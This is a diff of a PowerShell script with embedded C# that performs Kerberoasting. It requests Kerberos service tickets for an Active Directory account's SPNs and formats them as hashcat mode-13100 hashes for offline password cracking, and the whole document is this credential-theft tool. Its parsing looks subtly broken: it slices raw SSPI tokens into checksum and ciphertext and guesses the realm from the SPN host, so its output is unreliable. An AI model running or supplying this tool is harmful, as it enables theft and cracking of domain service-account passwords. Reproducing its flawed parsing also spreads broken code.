@@ -1,4 +1,3 @@
-# Load required native methods for Kerberos ticket request
 Add-Type @"
 using System;
 using System.Runtime.InteropServices;
@@ -51,40 +50,61 @@ public class K {
         public IntPtr pBuffers;
     }
 
-    public static byte[] GetRawTicket(string spn) {
+    public static string GetTicket(string spn) {
         IntPtr cred = IntPtr.Zero;
         IntPtr ctx = IntPtr.Zero;
         IntPtr expiry1 = IntPtr.Zero;
         IntPtr expiry2 = IntPtr.Zero;
         uint attr = 0;
 
-        SecBuffer secBuf = new SecBuffer();
-        secBuf.BufferType = 2; // SECBUFFER_TOKEN
-        secBuf.cbBuffer = 12288;
-        secBuf.pvBuffer = Marshal.AllocHGlobal((int)secBuf.cbBuffer);
-
-        IntPtr pSecBuf = Marshal.AllocHGlobal(Marshal.SizeOf(secBuf));
-        Marshal.StructureToPtr(secBuf, pSecBuf, false);
-
-        SecBufferDesc desc = new SecBufferDesc();
-        desc.ulVersion = 0;
-        desc.cBuffers = 1;
-        desc.pBuffers = pSecBuf;
-
         try {
-            if (AcquireCredentialsHandle(null, "Kerberos", 0x00000002, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, out cred, out expiry1) != 0)
-                return null;
+            SecBuffer secBuf = new SecBuffer();
+            secBuf.BufferType = 2; // SECBUFFER_TOKEN
+            secBuf.cbBuffer = 12288; // 12 KB buffer
+            secBuf.pvBuffer = Marshal.AllocHGlobal((int)secBuf.cbBuffer);
 
-            if (InitializeSecurityContext(ref cred, IntPtr.Zero, spn, 0x00001000, 0, 16, IntPtr.Zero, 0, out ctx, ref desc, out attr, out expiry2) != 0)
-                return null;
+            IntPtr pSecBuf = Marshal.AllocHGlobal(Marshal.SizeOf(secBuf));
+            Marshal.StructureToPtr(secBuf, pSecBuf, false);
+
+            SecBufferDesc desc = new SecBufferDesc();
+            desc.ulVersion = 0;
+            desc.cBuffers = 1;
+            desc.pBuffers = pSecBuf;
+
+            if (AcquireCredentialsHandle(
+                    null,
+                    "Kerberos",
+                    0x00000002, // SECPKG_CRED_OUTBOUND
+                    IntPtr.Zero,
+                    IntPtr.Zero,
+                    IntPtr.Zero,
+                    IntPtr.Zero,
+                    out cred,
+                    out expiry1) != 0)
+                return "";
+
+            if (InitializeSecurityContext(
+                    ref cred,
+                    IntPtr.Zero,
+                    spn,
+                    0x00001000, // ISC_REQ_ALLOCATE_MEMORY
+                    0,
+                    16,
+                    IntPtr.Zero,
+                    0,
+                    out ctx,
+                    ref desc,
+                    out attr,
+                    out expiry2) != 0)
+                return "";
 
             SecBuffer resultBuf = (SecBuffer)Marshal.PtrToStructure(pSecBuf, typeof(SecBuffer));
             if (resultBuf.cbBuffer == 0 || resultBuf.pvBuffer == IntPtr.Zero)
-                return null;
+                return "";
 
             byte[] data = new byte[resultBuf.cbBuffer];
             Marshal.Copy(resultBuf.pvBuffer, data, 0, data.Length);
-            return data;
+            return BitConverter.ToString(data).Replace("-", "");
         } finally {
             if (cred != IntPtr.Zero) FreeCredentialsHandle(cred);
         }
@@ -93,6 +113,7 @@ public class K {
 "@
 
 function Get-KerberosTicketHashcatFormat {
+    [CmdletBinding()]
     param(
         [Parameter(Mandatory)]
         [string]$SamAccountName
@@ -101,40 +122,48 @@ function Get-KerberosTicketHashcatFormat {
     try {
         $user = Get-ADUser -Filter "samaccountname -eq '$SamAccountName'" -Properties servicePrincipalName
         if (-not $user) {
-            Write-Error "User '$SamAccountName' not found."
+            Write-Error "User '$SamAccountName' not found in Active Directory."
             return
         }
 
         if (-not $user.servicePrincipalName) {
-            Write-Warning "No SPNs found for user '$SamAccountName'."
+            Write-Warning "No SPNs found for '$SamAccountName'."
             return
         }
 
         foreach ($spn in $user.servicePrincipalName) {
-            Write-Host "[*] Requesting TGS for SPN: $spn"
-            $ticketBytes = [K]::GetRawTicket($spn)
-            if (-not $ticketBytes) {
-                Write-Warning "[!] Failed to retrieve ticket for $spn"
-                continue
+            try {
+                Write-Host "`n[+] Requesting TGS for SPN: ${spn}"
+
+                $ticket = [K]::GetTicket($spn)
+                if (-not $ticket) {
+                    Write-Warning "Failed to retrieve ticket for ${spn}."
+                    continue
+                }
+
+                $ticketBytes = [System.Convert]::FromHexString($ticket)
+                if ($ticketBytes.Length -le 16) {
+                    Write-Warning "TGS data too short to extract valid checksum/ciphertext."
+                    continue
+                }
+
+                $checksumBytes = $ticketBytes[0..15]
+                $ciphertextBytes = $ticketBytes[16..($ticketBytes.Length - 1)]
+
+                $checksumHex = ($checksumBytes | ForEach-Object { $_.ToString("x2") }) -join ''
+                $ciphertextHex = ($ciphertextBytes | ForEach-Object { $_.ToString("x2") }) -join ''
+
+                $userPart = $SamAccountName
+                $realmPart = ($spn.Split("/")[-1]).ToUpper().Split(":")[0]  # host.domain.com
+                $spnPart = $spn.Replace(":", "~")
+
+                $hashcatFormat = "\$krb5tgs\$23\$*$userPart\$$realmPart\$$spnPart\$$checksumHex\$$ciphertextHex"
+                Write-Host "[+] Hashcat Format:`n$hashcatFormat"
+            } catch {
+                Write-Warning "Error while processing SPN '$spn': $_"
             }
-
-            # Split checksum and encrypted data
-            $checksum = $ticketBytes[0..15]
-            $ciphertext = $ticketBytes[16..($ticketBytes.Length - 1)]
-
-            $checksumHex = ($checksum | ForEach-Object { $_.ToString("x2") }) -join ""
-            $ciphertextHex = ($ciphertext | ForEach-Object { $_.ToString("x2") }) -join ""
-
-            # Construct domain/SPN part
-            $domain = ([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).Name
-            $sanitizedSpn = $spn.Replace("/", "-")
-
-            # Hashcat format (mode 13100)
-            $hashcatFormat = "$krb5tgs\$23\$*$SamAccountName\$$domain\$$spn\$$checksumHex\$$ciphertextHex"
-
-            Write-Host "[+] Hashcat Format:`n$hashcatFormat"
         }
     } catch {
-        Write-Error "Error: $_"
+        Write-Error "Fatal error: $_"
     }
 }
